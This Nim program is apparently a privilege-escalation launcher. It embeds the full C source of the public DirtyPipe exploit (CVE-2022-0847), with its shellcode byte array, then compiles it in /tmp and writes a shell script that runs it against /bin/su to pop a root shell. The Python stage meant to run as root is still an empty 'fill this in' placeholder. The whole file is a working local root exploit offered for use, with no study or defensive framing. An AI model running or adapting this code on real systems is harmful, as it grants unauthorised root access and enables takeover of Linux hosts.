import os , terminal , times , strformat
stdout.setForegroundColor(fgGreen)
stdout.write("[!] Starting..\n")
stdout.resetAttributes()
os.sleep(2000)
stdout.setForegroundColor(fgGreen)
stdout.write("[!] Initialized at : ")
stdout.resetAttributes()
stdout.setForegroundColor(fgRed)
stdout.write(now())
stdout.resetAttributes()
proc prereq(filename: string): string {.discardable.} =
    let word = filename 
    stdout.setForegroundColor(fgMagenta)
    stdout.write("\n[~] Checking for prerequisite : ")
    stdout.resetAttributes()
    stdout.setForegroundColor(fgYellow)
    stdout.write(fmt"{word}{'\n'}")
    let existPyth = fileExists("/bin/{filename}".fmt)
    if existPyth == true:
        stdout.resetAttributes()
        stdout.setForegroundColor(fgGreen)
        stdout.write("[✔] Prequisite is present. Moving on.")
        stdout.resetAttributes()
    else:
        stdout.resetAttributes()
        stdout.setForegroundColor(fgRed)
        stdout.write("[!] Prerequisite is not present. Moving on.")
        stdout.resetAttributes()
# make a proc , pass in var for diff files ez no boilerplate
prereq("python3")
prereq("gcc")
prereq("su")
prereq("dos2unix")
stdout.resetAttributes()
stdout.setForegroundColor(fgMagenta)
stdout.write("\n[~] Making dir in ")
stdout.resetAttributes()
stdout.setForegroundColor(fgYellow)
stdout.write("/tmp/\n")
stdout.resetAttributes()
os.createDir("/tmp/sus")
var
    cfilecode: string
    cfilename: string
cfilename = "dirty" 
cfilecode = """
// i am not the owner of this exploit.
// i am only using it.
// Exploit Title: Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
// Exploit Author: blasty (peter@haxx.in)
// Original Author: Max Kellermann (max.kellermann@ionos.com)
// CVE: CVE-2022-0847

/* SPDX-License-Identifier: GPL-2.0 */
/*
the credit is as belows:

 * Copyright 2022 CM4all GmbH / IONOS SE
 * author: Max Kellermann <max.kellermann@ionos.com>
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
unsigned char elfcode[] = {
	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int hax(char *filename, long offset, uint8_t *data, size_t len) {
	/* open the input file and validate the specified offset */
	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return -1;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return -1;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return -1;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return -1;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, len);
	if (nbytes < 0) {
		perror("write failed");
		return -1;
	}
	if ((size_t)nbytes < len) {
		fprintf(stderr, "short write\n");
		return -1;
	}

	close(fd);

	return 0;
}

int main(int argc, char **argv) {
	if (argc != 2) {
		fprintf(stderr, "Usage: %s SUID\n", argv[0]);
		return EXIT_FAILURE;
	}

	char *path = argv[1];
	uint8_t *data = elfcode;

	int fd = open(path, O_RDONLY);
	uint8_t *orig_bytes = malloc(sizeof(elfcode));
	lseek(fd, 1, SEEK_SET);
	read(fd, orig_bytes, sizeof(elfcode));
	close(fd);

	printf("[+] hijacking suid binary..\n");
	if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
		printf("[~] failed\n");
		return EXIT_FAILURE;
	}

	printf("[+] dropping suid shell..\n");
	system(path);

	printf("[+] restoring suid binary..\n");
	if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
		printf("[~] failed\n");
		return EXIT_FAILURE;
	}

	printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
	system("/tmp/sh");

	return EXIT_SUCCESS;
}"""
writeFile("/tmp/sus/{cfilename}.c".fmt,cfilecode)
stdout.resetAttributes()
stdout.setForegroundColor(fgCyan)
stdout.write("\n[~] Compiling root access code..")
stdout.resetAttributes()
let compileitbruh = os.execShellCmd("gcc /tmp/sus/dirty.c -o /tmp/sus/funni")
stdout.resetAttributes()
stdout.setForegroundColor(fgGreen)
stdout.write("\n[✔] Done.")
stdout.resetAttributes()
stdout.setForegroundColor(fgCyan)
stdout.write("\n[~] Writing .py file..")
var pycodevar: string 
pycodevar = """
#BRO
#FILL
#THIS
#IN
#WHEN
#ITS 
#READY
#OK
#????
import sys
sys.stdout.write("hi\n")
"""
writeFile("/tmp/sus/syk.py",pycodevar)
let huhwah = os.execShellCmd("chmod +x /tmp/sus/syk.py")
stdout.resetAttributes()
stdout.setForegroundColor(fgCyan)
stdout.write("\n[~] Writing .sh file..")
var shcodevar: string 
shcodevar = """
#!/bin/bash
chmod +x *
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
Wh1te='\033[0;37m'        # Wh1te
NC='\033[0m'
echo -e "${Red}[!] Entering $NC $Green .sh $NC $Red file with: $NC"
echo -e "${Yellow}Process ID: $NC $Cyan $$ $NC "
echo -e "${Yellow}Running Time: $NC $Cyan %r $NC "
echo "python3 syk.py" | ./funni /bin/su
"""
writeFile("/tmp/sus/row.sh",shcodevar)
let huhwahr = os.execShellCmd("chmod +x /tmp/sus/row.sh ")
stdout.resetAttributes()
stdout.setForegroundColor(fgCyan)
stdout.write("\n[~] Converting .sh to Unix format")
let idkbro = os.execShellCmd("dos2unix /tmp/sus/row.sh")
let please = os.execShellCmd("/tmp/sus/row.sh")
stdout.resetAttributes()
stdout.setForegroundColor(fgGreen)
stdout.write("\n[~] Exiting nim binary ( Process ID: ")
stdout.resetAttributes()
stdout.setForegroundColor(fgRed)
stdout.write(os.getCurrentProcessId())
stdout.resetAttributes()
stdout.setForegroundColor(fgGreen)
stdout.write(" Time: ")
stdout.resetAttributes()
stdout.setForegroundColor(fgRed)
stdout.write(now())
stdout.resetAttributes()
stdout.setForegroundColor(fgGreen)
stdout.write(" )\n")